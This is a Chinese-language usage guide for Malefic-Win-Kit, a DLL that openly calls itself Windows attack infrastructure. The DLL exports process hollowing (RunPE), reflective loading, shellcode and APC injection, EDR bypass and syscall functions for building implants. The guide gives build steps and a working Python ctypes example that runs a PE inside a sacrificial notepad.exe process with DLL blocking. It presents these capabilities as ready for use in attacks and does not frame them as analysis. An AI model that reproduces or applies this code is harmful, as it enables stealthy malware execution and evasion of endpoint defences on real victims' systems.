# Malefic-Win-Kit FFI 使用指南

Malefic-Win-Kit 是一个多语言 Windows 攻击基础设施，将复杂的底层 Windows 能力（进程注入、内存执行、反射加载等）封装为即用型 API，通过标准 C ABI 导出为 DLL。

**一次编写，随处使用。可以用任意语言编写一个功能完善的implant **

> 完整文档和示例请参考：[FFI Examples](https://github.com/chainreactors/implant/tree/master/examples/ffi)

### Features

- **PE 执行**: `RunPE`, `PELoader`, `InlinePE`, `RunSacrifice`
- **反射加载**: `ReflectiveLoader`, `MaleficLoadLibrary`
- **代码注入**: `RunShellcode`, `ApcLoaderInline`, `ApcLoaderSacriface`
- **高级功能**: `BOF`, `CSharpUtils`, `PowershellUtils`
- **EDR 绕过**: `EDRBypassUtils_REFRESH_DLL`, `EDRBypassUtils_BLOCK_DLL`
- **系统调用**: `RashoGate_RashoGateSyscall`, `SYSCALLS`
## 快速开始

### 编译 DLL

```bash
# 进入项目目录
cd D:\Programing\rust\implant

# 编译 malefic-win-kit DLL
cargo build --release -p malefic-win-kit

# 生成的 DLL 位于
# target/release/malefic_win_kit.dll
```

### 最小示例 (Python)

**调用流程**

1. **加载 DLL** - 运行时动态加载 `malefic_win_kit.dll`
2. **解析函数** - 通过导出名称获取函数地址
3. **声明签名** - 根据 `malefic-win-kit.h` 定义函数签名
4. **调用** - 遵循标准 C 调用约定 (cdecl)
5. **内存管理** - 使用 `SafeFreePipeData` 释放分配的内存


```python
import ctypes
from pathlib import Path

# 加载 DLL
dll = ctypes.CDLL("malefic_win_kit.dll")

# 定义 RawString 结构
class RawString(ctypes.Structure):
    _fields_ = [
        ("data", ctypes.POINTER(ctypes.c_uint8)),
        ("len", ctypes.c_size_t),
        ("capacity", ctypes.c_size_t)
    ]

# 声明函数签名
dll.RunPE.argtypes = [
    ctypes.c_char_p,  # sacrifice
    ctypes.POINTER(ctypes.c_uint8),  # pe_data
    ctypes.c_size_t,  # pe_len
    ctypes.c_char_p,  # args
    ctypes.c_uint32,  # pid
    ctypes.c_bool,    # block_dll
    ctypes.c_bool     # ppid
]
dll.RunPE.restype = RawString

# 读取 PE 文件
pe_data = Path("target.exe").read_bytes()

# 执行 RunPE
result = dll.RunPE(
    b"C:\\Windows\\System32\\notepad.exe",  # 牺牲进程
    (ctypes.c_uint8 * len(pe_data))(*pe_data),
    len(pe_data),
    b"--help",  # 参数
    0,          # PID (0 = 创建新进程)
    True,       # 阻止 DLL 加载
    False       # PPID 欺骗
)

# 获取输出
output = ctypes.string_at(result.data, result.len)
print(output.decode())

# 释放内存
dll.SafeFreePipeData(result.data)
```

任何支持 FFI 的语言都可以使用。详细说明请参考：[Language Support](https://github.com/chainreactors/implant/tree/master/examples/ffi#language-support)

项目提供了以下语言的示例：

| 语言 | 示例目录 | 文档 |
|------|---------|------|
| **C** | [c/](https://github.com/chainreactors/implant/tree/master/examples/ffi/c) | [README](https://github.com/chainreactors/implant/blob/master/examples/ffi/c/README.md) |
| **Go** | [go/](https://github.com/chainreactors/implant/tree/master/examples/ffi/go) | [README](https://github.com/chainreactors/implant/blob/master/examples/ffi/go/README.md) |
| **Rust** | [rust/](https://github.com/chainreactors/implant/tree/master/examples/ffi/rust) | [README](https://github.com/chainreactors/implant/blob/master/examples/ffi/rust/README.md) |
| **Python** | [python/](https://github.com/chainreactors/implant/tree/master/examples/ffi/python) | [README](https://github.com/chainreactors/implant/blob/master/examples/ffi/python/README.md) |
| **C#** | [csharp/](https://github.com/chainreactors/implant/tree/master/examples/ffi/csharp) | [README](https://github.com/chainreactors/implant/blob/master/examples/ffi/csharp/README.md) |


## API 参考

完整的 API 列表和详细说明请参考：

- [API Reference](https://github.com/chainreactors/implant/tree/master/examples/ffi#api-reference) - 完整 API 文档
- [malefic-win-kit.h](https://github.com/chainreactors/implant/blob/master/examples/ffi/malefic-win-kit.h) - C 头文件




## 相关资源

- [FFI 示例代码](https://github.com/chainreactors/malice-network/tree/master/examples/ffi)
- [API 头文件](https://github.com/chainreactors/malice-network/blob/master/examples/ffi/malefic-win-kit.h)
- [Malefic-Win-Kit 源码](https://github.com/chainreactors/malice-network/tree/master/malefic-win-kit)
- [IoM 文档](https://chainreactors.github.io/wiki/IoM/)
